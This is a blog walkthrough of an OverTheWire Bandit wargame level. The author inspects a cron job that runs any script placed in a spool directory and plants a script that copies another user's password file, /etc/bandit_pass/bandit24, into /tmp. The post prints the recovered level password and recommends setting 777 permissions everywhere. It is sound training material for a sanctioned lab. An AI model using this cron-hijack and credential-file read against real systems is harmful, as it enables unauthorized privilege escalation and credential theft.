---
layout: post
date:   2021-04-09 10:20:00 +0100
categories: OverTheWire Bandit
---

# Level goal
```bash
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

cron, crontab, crontab(5) (use “man 5 crontab” to access this)
```

## Lets look in that folder again and look at what the bandit24 job does..

```bash
bandit23@bandit:/tmp/zd23$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

## Lets open that script and take a look

```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

## So, it looks like we need to create a script, put it in the /var/spool/bandit24 folder. Guessing because there's nothing there we need to get the bandit24 password from the /etc/bandit_pass directory (/etc/bandit_pass/bandit24)

## Lets create a tmp directory and a script
```bash
bandit23@bandit:~$ mkdir /tmp/zd23
bandit23@bandit:~$ cd /tmp/zd23
bandit23@bandit:/tmp/zd23$ vi script.sh
```

```bash
#!/bin/sh
cat /etc/bandit_pass/bandit24 >> /tmp/zd23/beep
```

## Lets make it executable
```bash
bandit23@bandit:/tmp/zd23$ chmod 777 script.sh
bandit23@bandit:/tmp/zd23$ ls -ls
total 4
4 -rwxrwxrwx 1 bandit23 root 52 Apr  9 12:21 script.sh
```

## Lets copy it to the spool directory and see what happens

```bash
bandit23@bandit:/tmp/zd23$ cp script.sh /var/spool/bandit24
# An eternity laster..
bandit23@bandit:/tmp/zd23$ ls
beep  script.sh
bandit23@bandit:/tmp/zd23$ cat beep
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## Okay - So nothing actually happened for ages, had to do some googling. Had to actually give the /tmp/zd23 folder permissions to be written to.. It then worked (777 all the things)

VICTORY.

## The password for level 24: 	

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

On the next episode of Bandit...

```bash
ssh bandit24@localhost
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```